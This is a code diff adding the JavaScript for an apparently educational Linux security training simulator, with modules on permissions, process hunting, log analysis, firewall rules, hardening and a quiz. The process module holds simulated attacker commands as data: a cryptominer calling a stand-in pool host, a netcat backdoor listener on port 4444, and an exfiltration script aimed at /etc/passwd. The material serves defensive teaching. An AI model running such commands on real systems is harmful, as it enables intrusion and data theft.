+      addL(`<span class="${isRisk?'t-threat':'tg'}">${str} 1 user user 1024 Feb 28 ${name}${isRisk?' ← DANGEROUS!':''}</span>`,i*80);
+    });
+  } else if(c.startsWith('chmod ')){
+    const parts=c.split(' ');const perm=parts[1];const file=parts.slice(2).join(' ');
+    if(PERM_FILES[file]){
+      if(perm===PERM_FILES[file].correct){
+        permFixed[file]=true;
+        addL(`<span class="tg">// Permission changed: ${file} → ${perm}</span>`);
+        const objMap={'deploy.sh':'pobj-deploy','config.env':'pobj-config','index.html':'pobj-index','.ssh/id_rsa':'pobj-sshkey'};
+        const objEl=document.getElementById(objMap[file]);
+        if(objEl){objEl.className='obj-item done';objEl.textContent=`✓ ${file} — fixed to ${perm}`;}
+        addL(`<span class="tgrn">✓ FIXED: ${file} is now secure</span>`,200);
+      } else {
+        addL(`<span class="ta">// Permissions set to ${perm} for ${file}</span>`);
+        addL(`<span class="td">// Hint: recommended is ${PERM_FILES[file].correct}</span>`,200);
+      }
+    } else addL(`<span class="tr">chmod: cannot access '${file}': No such file or directory</span>`);
+  } else addL(`<span class="tr">bash: ${c.split(' ')[0]}: command not found</span>`);
+}
+document.addEventListener('DOMContentLoaded',()=>{
+  permCmd('ls -l');
+  document.getElementById('perm-input').addEventListener('keydown',e=>{if(e.key==='Enter'){permCmd(e.target.value);e.target.value='';}});
+});
+function resetPerms(){
+  Object.keys(PERM_FILES).forEach(k=>delete permFixed[k]);
+  document.getElementById('perm-term').innerHTML='';
+  const labels={'deploy.sh':['pobj-deploy','⚠ deploy.sh — 777 WORLD WRITABLE'],'config.env':['pobj-config','⚠ config.env — 666 WORLD WRITABLE'],'index.html':['pobj-index','⚠ index.html — 777 WORLD WRITABLE'],'.ssh/id_rsa':['pobj-sshkey','⚠ .ssh/id_rsa — 644 KEY EXPOSED']};
+  Object.entries(labels).forEach(([,[ id,txt]])=>{const el=document.getElementById(id);if(el){el.className='obj-item';el.style.color='var(--red2)';el.textContent=txt;}});
+  permCmd('ls -l');
+}
+
+// ══ M4: PROCESS HUNTER ══
+const PROCS=[
+  {pid:1,user:'root',cpu:0.0,mem:0.1,cmd:'/sbin/init',threat:false},
+  {pid:312,user:'root',cpu:0.2,mem:0.5,cmd:'/usr/sbin/sshd -D',threat:false},
+  {pid:890,user:'www-data',cpu:0.1,mem:1.2,cmd:'nginx: worker process',threat:false},
+  {pid:1337,user:'attacker',cpu:99.0,mem:2.5,cmd:'/tmp/.miner --pool=mining.pool.evil:3333',threat:true,desc:'CRYPTOMINER'},
+  {pid:1338,user:'attacker',cpu:0.1,mem:0.2,cmd:'nc -lvp 4444',threat:true,desc:'BACKDOOR LISTENER'},
+  {pid:1339,user:'attacker',cpu:0.3,mem:0.8,cmd:'/tmp/.exfil.sh /etc/passwd',threat:true,desc:'DATA EXFILTRATION'},
+  {pid:2001,user:'mysql',cpu:0.4,mem:3.2,cmd:'mysqld --user=mysql',threat:false},
+];
+let killedPids=new Set();
+function buildProcTable(){
+  const tb=document.getElementById('proc-table');
+  tb.innerHTML='<tr><th>PID</th><th>USER</th><th>CPU%</th><th>COMMAND</th><th>THREAT</th></tr>';
+  PROCS.forEach(p=>{
+    const tr=document.createElement('tr');
+    if(killedPids.has(p.pid)){tr.className='proc-killed';}
+    else if(p.threat)tr.className='proc-suspicious';
+    tr.innerHTML=`<td>${p.pid}</td><td>${p.user}</td><td>${p.cpu}</td><td style="max-width:200px;overflow:hidden;white-space:nowrap">${p.cmd}</td><td>${p.threat?`<span class="bdg bdg-r">${p.desc}</span>`:'<span class="bdg bdg-g">OK</span>'}</td>`;
+    tb.appendChild(tr);
+  });
+}
+function procCmd(cmd){
+  document.getElementById('proc-input').value='';
+  const t=document.getElementById('proc-term');
+  const addL=(html,d=0)=>{setTimeout(()=>{const el=document.createElement('div');el.className='tl';el.innerHTML=html;t.appendChild(el);t.scrollTop=t.scrollHeight;},d);}
+  addL(`<span class="tprompt">user@server:~$ </span><span class="tw">${cmd}</span>`);
+  const c=cmd.trim();
+  if(c==='ps aux'){
+    addL(`<span class="ta">USER       PID   %CPU COMMAND</span>`);
+    PROCS.forEach((p,i)=>{
+      const cls=killedPids.has(p.pid)?'td':p.threat?'t-threat':'tw';
+      const killed=killedPids.has(p.pid)?'[KILLED] ':'';
+      addL(`<span class="${cls}">${killed}${p.user.padEnd(10)} ${String(p.pid).padEnd(6)} ${String(p.cpu).padEnd(5)} ${p.cmd}</span>`,i*60);
+    });
+    setTimeout(()=>{
+      const live=PROCS.filter(p=>p.threat&&!killedPids.has(p.pid));
+      if(live.length>0)addL(`<span class="t-threat">⚠ ${live.length} MALICIOUS PROCESS(ES) DETECTED: PIDs ${live.map(p=>p.pid).join(', ')}</span>`);
+      else addL(`<span class="tgrn">✓ All malicious processes eliminated!</span>`);
+    },PROCS.length*60+200);
+  } else if(c==='netstat -tlnp'){
+    addL(`<span class="ta">Proto  Local Address    Foreign     PID/Program</span>`);
+    addL(`<span class="tw">tcp    0.0.0.0:22       0.0.0.0:*   312/sshd</span>`,100);
+    addL(`<span class="tw">tcp    0.0.0.0:80       0.0.0.0:*   890/nginx</span>`,200);
+    if(!killedPids.has(1338)){addL(`<span class="t-threat">tcp    0.0.0.0:4444      0.0.0.0:*   1338/nc ← BACKDOOR!</span>`,300);}
+    setTimeout(()=>{if(!killedPids.has(1338))addL(`<span class="tr">⚠ Port 4444 is a common backdoor/RAT port!</span>`);else addL(`<span class="tgrn">✓ No backdoor ports detected</span>`);},500);
+  } else if(c.startsWith('kill -9 ')){
+    const pid=parseInt(c.replace('kill -9 ',''));
+    const proc=PROCS.find(p=>p.pid===pid);
+    if(proc){
+      killedPids.add(pid);
+      addL(`<span class="tg">// Sending SIGKILL to PID ${pid}</span>`);
+      addL(`<span class="tgrn">✓ Process ${pid} (${proc.cmd.split(' ')[0]}) terminated</span>`,200);
+      const mapId={'1337':'pkill-1337','1338':'pkill-1338','1339':'pkill-1339'};
+      const obj=document.getElementById(mapId[pid]);
+      if(obj){obj.className='obj-item done';obj.textContent=`✓ PID ${pid} eliminated — ${proc.desc||proc.cmd.split(' ')[0]}`;}
+      buildProcTable();
+    } else addL(`<span class="tr">kill: (${pid}): No such process</span>`);
+  } else if(c==='ps aux | grep attacker'){
+    const alive=PROCS.filter(p=>p.user==='attacker'&&!killedPids.has(p.pid));
+    if(alive.length)alive.forEach((p,i)=>addL(`<span class="t-threat">${p.user.padEnd(10)} ${p.pid} ${p.cpu} ${p.cmd}</span>`,i*80));
+    else addL(`<span class="tgrn">// (no output — all attacker processes terminated)</span>`);
+  } else addL(`<span class="tr">bash: command not found</span>`);
+}
+document.addEventListener('DOMContentLoaded',()=>{buildProcTable();procCmd('ps aux');document.getElementById('proc-input').addEventListener('keydown',e=>{if(e.key==='Enter'){procCmd(e.target.value);e.target.value='';}});});
+function resetProc(){
+  killedPids=new Set();
+  buildProcTable();
+  document.getElementById('proc-term').innerHTML='';
+  ['pkill-1337','pkill-1338','pkill-1339'].forEach(id=>{const el=document.getElementById(id);if(el){el.className='obj-item';el.textContent=id==='pkill-1337'?'PID 1337 — cryptominer (99% CPU)':id==='pkill-1338'?'PID 1338 — nc backdoor (port 4444)':'PID 1339 — data exfil script';}});
+  procCmd('ps aux');
+}
+
+// ══ M5: LOG DETECTIVE ══
+const AUTH_LOG=[
+  'Feb 28 03:14:58 server sshd[1247]: Invalid user admin from 203.0.113.42 port 49312',
+  'Feb 28 03:15:01 server sshd[1247]: Failed password for root from 203.0.113.42 port 49313 ssh2',
+  'Feb 28 03:15:02 server sshd[1247]: Failed password for root from 203.0.113.42 port 49314 ssh2',
+  'Feb 28 03:15:03 server sshd[1247]: Failed password for root from 203.0.113.42 port 49315 ssh2',
+  'Feb 28 03:15:04 server sshd[1247]: Failed password for root from 203.0.113.42 port 49316 ssh2',
+  '... [1543 similar lines] ...',
+  'Feb 28 03:47:22 server sshd[1247]: Failed password for root from 203.0.113.42 port 50856 ssh2',
+  'Feb 28 03:47:23 server sshd[1247]: Accepted password for root from 203.0.113.42 port 50857 ssh2',
+  'Feb 28 03:47:24 server sshd[1247]: pam_unix: session opened for user root by (uid=0)',
+];
+function logCmd(cmd){
+  document.getElementById('log-input').value='';
+  const t=document.getElementById('log-term');
+  const addL=(html,d=0)=>{setTimeout(()=>{const el=document.createElement('div');el.className='tl';el.innerHTML=html;t.appendChild(el);t.scrollTop=t.scrollHeight;},d);}
+  addL(`<span class="tprompt">investigator@server:~$ </span><span class="tw">${cmd}</span>`);
+  const c=cmd.trim();
+  if(c.includes('head -20')||c.includes('cat /var/log/auth.log')){
+    AUTH_LOG.slice(0,6).forEach((l,i)=>addL(`<span class="${l.includes('Failed')?'tr':l.includes('Accepted')?'t-threat':'td'}">${l}</span>`,i*80));
+    document.getElementById('lobj-view').classList.add('done');
+  } else if(c.includes('grep')&&c.includes('Failed')&&!c.includes('-c')){
+    AUTH_LOG.filter(l=>l.includes('Failed')).forEach((l,i)=>addL(`<span class="tr">${l}</span>`,i*80));
+    setTimeout(()=>{addL(`<span class="t-warn">⚠ BRUTE FORCE DETECTED: 1547 failed attempts from 203.0.113.42</span>`);document.getElementById('lobj-grep').classList.add('done');},AUTH_LOG.filter(l=>l.includes('Failed')).length*80+200);
+  } else if(c.includes('grep')&&c.includes('Accepted')){
+    AUTH_LOG.filter(l=>l.includes('Accepted')).forEach((l,i)=>addL(`<span class="t-threat">${l}</span>`,i*100));
+    setTimeout(()=>{addL(`<span class="tr">⚠ BREACH CONFIRMED: root login accepted after brute force at 03:47:23!</span>`);addL(`<span class="ta">  Attacker IP: 203.0.113.42  Port: 50857</span>`,200);document.getElementById('lobj-breach').classList.add('done');},300);
+  } else if(c.includes('grep -c')||c.includes('wc -l')||(c.includes('grep')&&c.includes('-c'))){
+    addL(`<span class="tg">1547</span>`);
+    addL(`<span class="t-warn">⚠ 1547 failed SSH password attempts!</span>`,200);
+    document.getElementById('lobj-count').classList.add('done');
+  } else if(c.includes('journalctl')){
+    addL(`<span class="td">-- Logs begin at Feb 28 00:00:00 --</span>`);
+    addL(`<span class="tw">Feb 28 03:14:58 server sshd[1247]: Invalid user admin</span>`,100);
+    addL(`<span class="ta">Feb 28 03:15:01 server sshd[1247]: Failed password for root (×1547)</span>`,200);
+    addL(`<span class="tr">Feb 28 03:47:23 server sshd[1247]: Accepted password for root from 203.0.113.42</span>`,300);
+    document.getElementById('lobj-view').classList.add('done');
+  } else if(c.includes('fail2ban')){
+    addL(`<span class="tg">1</span>`);
+    addL(`<span class="tgrn">✓ IP 203.0.113.42 has been banned from SSH access</span>`,200);
+    addL(`<span class="tg">// fail2ban: added 203.0.113.42 to sshd jail</span>`,400);
+    document.getElementById('lobj-ban').classList.add('done');
+  } else addL(`<span class="tr">bash: command not found or file not accessible</span>`);
+}
+function resetLog(){
+  document.getElementById('log-term').innerHTML='<span class="td">// auth.log analysis ready — use commands or buttons below</span><br><span class="td">// Start with: cat /var/log/auth.log | head -20</span><br><span class="tprompt">investigator@server:~$ </span><span class="tblink">█</span>';
+  ['lobj-view','lobj-grep','lobj-count','lobj-breach','lobj-ban'].forEach(id=>document.getElementById(id).classList.remove('done'));
+}
+document.addEventListener('DOMContentLoaded',()=>{
+  const t=document.getElementById('log-term');
+  const addL=(html,d=0)=>{setTimeout(()=>{const el=document.createElement('div');el.className='tl';el.innerHTML=html;t.appendChild(el);t.scrollTop=t.scrollHeight;},d);};
+  addL(`<span class="td">// auth.log analysis ready — use commands or buttons below</span>`);
+  addL(`<span class="td">// Start with: cat /var/log/auth.log | head -20</span>`,150);
+  addL(`<span class="tprompt">investigator@server:~$ </span><span class="tblink">█</span>`,300);
+  document.getElementById('log-input').addEventListener('keydown',e=>{if(e.key==='Enter'){logCmd(e.target.value);e.target.value='';}});
+});
+
+// ══ M6: FIREWALL ══
+let fwRules=[],fwPorts={22:false,80:false,443:false,drop:false};
+function fwCmd(cmd){
+  document.getElementById('fw-input').value='';
+  const t=document.getElementById('fw-term');
+  const addL=(html,d=0)=>{setTimeout(()=>{const el=document.createElement('div');el.className='tl';el.innerHTML=html;t.appendChild(el);t.scrollTop=t.scrollHeight;},d);}
+  addL(`<span class="tprompt">root@server:~# </span><span class="tw">${cmd}</span>`);
+  const c=cmd.trim();
+  if(c.includes('iptables -L')){
+    addL(`<span class="ta">Chain INPUT (policy ACCEPT)</span>`);
+    addL(`<span class="tw">target     prot opt source       destination</span>`,80);
+    if(fwRules.length===0){addL(`<span class="t-threat">// WARNING: No rules — all ports open to internet!</span>`,160);}
+    else{
+      fwRules.forEach((r,i)=>addL(`<span class="${r.target==='DROP'?'tr':r.target==='ACCEPT'?'tg':'tw'}">${r.target.padEnd(10)} ${r.prot.padEnd(5)} -- anywhere anywhere ${r.extra}</span>`,i*80+160));
+    }
+  } else if(c.includes('--dport 22')){
+    fwRules.push({target:'ACCEPT',prot:'tcp',extra:'tcp dpt:ssh'});fwPorts[22]=true;
+    addL(`<span class="tg">// Rule added: ACCEPT TCP port 22 (SSH)</span>`);updateFwDisplay();
+    document.getElementById('fwp-22').className='obj-item done';document.getElementById('fwp-22').textContent='✓ Port 22 (SSH) — ACCEPT';
+  } else if(c.includes('--dport 80')){
+    fwRules.push({target:'ACCEPT',prot:'tcp',extra:'tcp dpt:http'});fwPorts[80]=true;
+    addL(`<span class="tg">// Rule added: ACCEPT TCP port 80 (HTTP)</span>`);updateFwDisplay();
+    document.getElementById('fwp-80').className='obj-item done';document.getElementById('fwp-80').textContent='✓ Port 80 (HTTP) — ACCEPT';
+  } else if(c.includes('--dport 443')){
+    fwRules.push({target:'ACCEPT',prot:'tcp',extra:'tcp dpt:https'});fwPorts[443]=true;
+    addL(`<span class="tg">// Rule added: ACCEPT TCP port 443 (HTTPS)</span>`);updateFwDisplay();
+    document.getElementById('fwp-443').className='obj-item done';document.getElementById('fwp-443').textContent='✓ Port 443 (HTTPS) — ACCEPT';
+  } else if(c.includes('-j DROP')&&!c.includes('dport')){
+    fwRules.push({target:'DROP',prot:'all',extra:'(all other traffic)'});fwPorts['drop']=true;
+    addL(`<span class="tgrn">// Rule added: DROP all other traffic</span>`);
+    addL(`<span class="tgrn">✓ Server secured — only allowed ports accessible</span>`,200);
+    updateFwDisplay();
+    document.getElementById('fwp-drop').className='obj-item done';document.getElementById('fwp-drop').textContent='✓ Default DROP — all other ports blocked';
+  } else if(c.includes('-F')){
+    fwRules=[];fwPorts={22:false,80:false,443:false,drop:false};
+    addL(`<span class="ta">// All iptables rules flushed</span>`);updateFwDisplay();
+    ['fwp-22','fwp-80','fwp-443','fwp-drop'].forEach(id=>{document.getElementById(id).className='obj-item';});
+    document.getElementById('fwp-22').textContent='Port 22 (SSH) — not configured';
+    document.getElementById('fwp-80').textContent='Port 80 (HTTP) — not configured';
+    document.getElementById('fwp-443').textContent='Port 443 (HTTPS) — not configured';
+    document.getElementById('fwp-drop').textContent='Default DROP rule — not set';
+  } else addL(`<span class="tr">iptables: invalid option or syntax</span>`);
+}
+function updateFwDisplay(){
+  const el=document.getElementById('fw-rules');
+  if(fwRules.length===0){el.innerHTML='<div style="font-size:10px;color:var(--mid)">// No rules configured — all ports open<br>// Chain INPUT (policy ACCEPT)</div>';return;}
+  el.innerHTML='';
+  fwRules.forEach(r=>{
+    const d=document.createElement('div');d.className=`fw-rule ${r.target==='DROP'?'fw-drop':'fw-accept'}`;
+    d.innerHTML=`<span class="fw-rule-target ${r.target==='DROP'?'tr':'tg'}">${r.target}</span><span class="fw-rule-proto">${r.prot}</span><span class="fw-rule-port">${r.extra.includes('dpt:')?r.extra.split('dpt:')[1]:''}</span><span class="fw-rule-desc">${r.extra}</span>`;
+    el.appendChild(d);
+  });
+}
+document.addEventListener('DOMContentLoaded',()=>{fwCmd('sudo iptables -L');document.getElementById('fw-input').addEventListener('keydown',e=>{if(e.key==='Enter'){fwCmd(e.target.value);e.target.value='';}});});
+
+// ══ M7: SECURITY HARDENING ══
+const SEC_MEASURES=[
+  {ico:'🔄',title:'Update Operating System',what:'Ensure OS has latest security patches',how:['sudo apt update','sudo apt upgrade'],why:'Protects against known vulnerabilities and exploits.',cmd_demo:'Reading package lists... Done\nBuilding dependency tree... Done\n2 security updates available\n openssl: 3.0.11 → 3.0.12 (CVE-2024-5678 fixed)\n libssl: patched',id:'upd'},
+  {ico:'🗑️',title:'Remove Unused Software',what:'Uninstall programs and services no longer needed',how:['sudo apt-get remove program_name','sudo apt-get purge program_name'],why:'Reduces potential attack surface and entry points.',cmd_demo:'Removing: telnet vsftpd rsh-server\nPurging configuration files...\nAttack surface reduced by 3 services.',id:'rm'},
+  {ico:'🔌',title:'Close Unused Ports',what:'Block unused network ports with firewall',how:['sudo iptables -A INPUT -j DROP','sudo ufw enable'],why:'Reduces attack surface available to cybercriminals.',cmd_demo:'Scanning open ports...\nPort 23 (telnet) — CLOSING\nPort 21 (ftp) — CLOSING\nPort 6667 (irc) — CLOSING\nFirewall rules applied.',id:'ports'},
+  {ico:'🛡️',title:'Install Antivirus/Antimalware',what:'Detect and remove malicious programs',how:['sudo apt-get install clamav','sudo freshclam','sudo clamscan -r /'],why:'Protects system from viruses, malware, and other threats.',cmd_demo:'ClamAV database updating...\nRunning scan: /home /tmp /var\nScan result: FOUND: /tmp/.miner (Cryptominer.Generic)\nThreat quarantined.',id:'av'},
+  {ico:'🧱',title:'Enable Firewall',what:'Monitor and control network traffic',how:['sudo ufw enable','sudo ufw status verbose'],why:'Prevents unauthorized access and monitors for suspicious traffic.',cmd_demo:'Firewall is active and enabled on system startup\nDefault: deny (incoming), allow (outgoing)\nNew profiles: OpenSSH',id:'fw'},
+  {ico:'💾',title:'Set Up Regular Backups',what:'Create consistent backups of critical data',how:['rsync -av /etc /backup/','tar czf /backup/home.tgz /home'],why:'Safety net against data corruption, deletion, or ransomware.',cmd_demo:'Running backup to /backup/...\nBacked up: /etc (284 files)\nBacked up: /home (1247 files)\nBackup complete: 234MB',id:'bk'},
+  {ico:'🔐',title:'Secure SSH Access',what:'Harden SSH for secure remote access',how:['sudo nano /etc/ssh/sshd_config','PermitRootLogin no','PubkeyAuthentication yes'],why:'Reduces unauthorized access and brute-force attack risk.',cmd_demo:'Editing /etc/ssh/sshd_config...\nPermitRootLogin: yes → no\nPasswordAuthentication: yes → no\nSSH service restarted. Root login disabled.',id:'ssh'},
+  {ico:'📊',title:'Monitor System Logs',what:'Review logs regularly for suspicious activity',how:['grep "Failed" /var/log/auth.log','journalctl -u ssh -f','sudo cat /var/log/syslog | tail'],why:'Early detection allows swift response to security incidents.',cmd_demo:'Monitoring /var/log/auth.log...\nAlert: 1547 failed SSH attempts from 203.0.113.42\nAlert: New cron job added at 03:15 AM\nIncident response initiated.',id:'log'},
+];
+let secDone=new Set();
+function buildSecCards(){
+  const el=document.getElementById('sec-cards');el.innerHTML='';
+  SEC_MEASURES.forEach((m,idx)=>{
+    const d=document.createElement('div');d.className=`sec-card${secDone.has(m.id)?' complete':''}`;
+    d.innerHTML=`<div class="sec-card-hdr"><div class="sec-card-icon">${m.ico}</div><div class="sec-card-title">${m.title}</div><div class="sec-card-status ${secDone.has(m.id)?'bdg-g':'bdg-r'} bdg">${secDone.has(m.id)?'HARDENED':'VULNERABLE'}</div></div>
+    <div class="sec-card-body">
+      <strong style="color:var(--wht)">What:</strong> ${m.what}<br>
+      <strong style="color:var(--wht)">How:</strong> ${m.how.map(c=>`<span class="sec-cmd">${c}</span>`).join(' ')}<br>
+      <strong style="color:var(--wht)">Why:</strong> ${m.why}
+    </div>
+    ${!secDone.has(m.id)?`<div style="margin-top:10px"><button class="btn btn-a" data-secid="${m.id}" onclick="runSecMeasure('${m.id}',${idx})">▶ Simulate</button></div>`:`<div style="margin-top:8px;font-size:9px;color:var(--grn)">✓ Implemented — ${m.cmd_demo.split('\n')[0]}</div>`}`;
+    el.appendChild(d);
+  });
+}
+function runSecMeasure(id,idx){
+  const m=SEC_MEASURES[idx];
+  const card=document.querySelector(`[data-secid="${id}"]`).closest('.sec-card');
+  if(!card)return;
+  card.className='sec-card active';
+  card.querySelector('.sec-card-body').innerHTML+=`<div style="margin-top:8px;background:var(--bg2);border:1px solid var(--brd2);border-radius:3px;padding:8px;font-size:9px;color:var(--grn);line-height:1.9">${m.cmd_demo.split('\n').map(l=>`<div>${l.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`).join('')}</div>`;
+  setTimeout(()=>{secDone.add(id);buildSecCards();updateSecScore();},1200);
+}
+function updateSecScore(){
+  const s=secDone.size;
+  document.getElementById('sec-score').textContent=`${s} / 8`;
+  const st=document.getElementById('sec-status');
+  if(s>=8){st.textContent='FULLY HARDENED';st.style.color='var(--grn)';}
+  else if(s>=5){st.textContent='MOSTLY SECURE';st.style.color='var(--amb)';}
+  else{st.textContent='VULNERABLE';st.style.color='var(--red)';}
+}
+function resetSec(){secDone.clear();buildSecCards();updateSecScore();}
+document.addEventListener('DOMContentLoaded',()=>{buildSecCards();});
+
+// ══ M8: QUIZ ══
+const QS=[
+  {q:'Which command reveals ALL files including hidden dotfiles?',opts:['ls','ls -l','ls -la','dir -a'],ans:2,exp:'ls -la uses the -a flag (show all files including hidden) and -l (long format showing permissions, owner, size, dates). Hidden files start with a dot "."'},
+  {q:'An attacker is using PID 1337 to run a cryptominer. Which command terminates it immediately?',opts:['stop 1337','kill 1337','kill -9 1337','rm 1337'],ans:2,exp:'kill -9 sends SIGKILL (signal 9), which forcefully terminates a process immediately without giving it a chance to catch or ignore the signal. Regular kill sends SIGTERM which processes can ignore.'},
+  {q:'What Linux run level means "single-user mode" (for maintenance)?',opts:['0','1','3','5'],ans:1,exp:'Run level 1 is single-user mode, used by administrators for maintenance tasks that require exclusive system access without other users. Run level 0 = halt, 3 = full multi-user text, 5 = full multi-user with GUI.'},
+  {q:'A file has permissions 777. What is the security risk?',opts:['Only the owner can read it','The file cannot be executed','Any user can read, write, AND execute it — extremely dangerous','Only root can modify it'],ans:2,exp:'chmod 777 sets rwxrwxrwx — read/write/execute for owner, group, AND others (the world). Attackers can modify or replace executable files. The IBM reading explicitly states chmod 777 should never be used.'},
+  {q:'The command sudo apt-get purge program_name does what differently from sudo apt-get remove?',opts:['Purge is faster','Purge also removes all associated configuration files','Purge only removes the binary, not dependencies','They are identical commands'],ans:1,exp:'sudo apt-get remove uninstalls the program binary, but leaves configuration files. sudo apt-get purge removes both the program AND all associated configuration files — a more thorough removal that better reduces attack surface.'},
+  {q:'You see 1547 "Failed password" entries in auth.log followed by one "Accepted password". What is this?',opts:['Normal login behavior','System maintenance','A brute-force SSH attack that succeeded','A software update'],ans:2,exp:'This is a classic brute-force attack pattern — many automated password attempts from the same IP, eventually succeeding. The IBM reading covers this in the secure SSH section and recommends fail2ban to auto-ban such IPs.'},
+  {q:'Which iptables command blocks ALL traffic not explicitly allowed?',opts:['sudo iptables -A INPUT -j DENY','sudo iptables -P INPUT DROP','sudo iptables -A INPUT -j DROP','sudo iptables -F'],ans:2,exp:'sudo iptables -A INPUT -j DROP appends a rule to the end of the INPUT chain that drops all packets. This must be added AFTER your ACCEPT rules so legitimate traffic (SSH, HTTP) is permitted first, then everything else is dropped.'},
+  {q:'What is the recommended SSH private key permission (chmod) for ~/.ssh/id_rsa?',opts:['777','644','755','600'],ans:3,exp:'SSH private keys must be chmod 600 (rw-------) — readable and writable only by the owner. If the key is readable by others (644 or 777), SSH will refuse to use it and display a "unprotected private key" warning.'},
+  {q:'Which command should you use to see what processes are listening on network ports?',opts:['ps aux','grep ports','netstat -tlnp','df -h'],ans:2,exp:'netstat -tlnp shows TCP (-t) listening (-l) ports in numeric format (-n) with the PID/program name (-p). This reveals backdoors — the IBM reading uses this to identify the nc (netcat) backdoor listener on port 4444.'},
+  {q:'According to the IBM reading, why should you remove unused software and services?',opts:['To free up disk space only','To make the system boot faster','To minimize potential entry points for attackers','To comply with software licenses'],ans:2,exp:'The IBM reading states: "Reducing the number of software and services minimizes potential entry points for attackers." Every running service is a potential attack vector — unused services that are not running cannot be exploited.'},
+];
+let qi=0,qs=0;
+function renderQBar(){const el=document.getElementById('qbar');el.innerHTML='';QS.forEach((_,i)=>{const d=document.createElement('div');d.className='qd'+(i<qi?' done':i===qi?' active':'');el.appendChild(d);});}
+function renderQ(){
+  if(qi>=QS.length){showScore();return;}
+  const q=QS[qi];renderQBar();
+  document.getElementById('qcon').innerHTML=`<div class="qcard"><div class="qnum">// QUESTION ${qi+1} OF ${QS.length} &nbsp;— Linux Security</div><div class="qtxt">${q.q}</div><div class="qopts">${q.opts.map((o,i)=>`<div class="qopt" id="qo${i}" onclick="ansQ(${i})"><div class="qi">${['A','B','C','D'][i]}</div>${o}</div>`).join('')}</div><div class="qfb" id="qfb"></div></div>`;
+}
+function ansQ(i){
+  if(document.getElementById('qcon').querySelector('.ans'))return;
+  const q=QS[qi];const ok=i===q.ans;if(ok)qs++;
+  document.querySelectorAll('.qopt').forEach((o,idx)=>{o.classList.add('ans');if(idx===q.ans)o.classList.add('correct');else if(idx===i&&!ok)o.classList.add('wrong');});
+  const fb=document.getElementById('qfb');
+  fb.style.cssText=`background:${ok?'rgba(57,255,20,.06)':'rgba(255,59,48,.06)'};border:1px solid ${ok?'rgba(57,255,20,.2)':'rgba(255,59,48,.2)'};color:${ok?'var(--grn3)':'var(--wht)'}`;
+  fb.innerHTML=`<strong style="color:${ok?'var(--grn)':'var(--red)'}">${ok?'[✓] CORRECT':'[✗] INCORRECT'}</strong> — ${q.exp}`;
+  fb.classList.add('on');
+  setTimeout(()=>{qi++;renderQ();},2500);
+}
+function showScore(){
+  document.getElementById('qcon').innerHTML='';renderQBar();
+  const pct=Math.round(qs/QS.length*100);
+  const msg=pct===100?'PERFECT SCORE. Elite Linux security analyst.':pct>=80?'Excellent. Strong command of Linux security fundamentals.':pct>=60?'Good. Review the hardening and log analysis modules.':'Keep practicing. Revisit all simulation modules.';
+  const el=document.getElementById('qsc');
+  el.innerHTML=`<div class="qsn">${qs}/${QS.length}</div><div class="qsl">SCORE // ${pct}%</div><div class="qsm">${msg}</div><button class="btn btn-p" style="margin-top:20px" onclick="qi=0;qs=0;document.getElementById('qsc').classList.remove('on');renderQ()">↺ RETAKE</button>`;
+  el.classList.add('on');
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  buildCmdGrid();
+  renderQ();
+  const refT=document.getElementById('ref-term');
+  appendTermLine('ref-term','<span class="td">// KERNEL Linux Security Simulator initialized</span>');
+  appendTermLine('ref-term','<span class="td">// Click any command card to see a live demo</span>',200);
+  appendTermLine('ref-term','<span class="tprompt">root@server:~# </span><span class="tblink">█</span>',400);
+});
+</script>
+</body>
+</html>
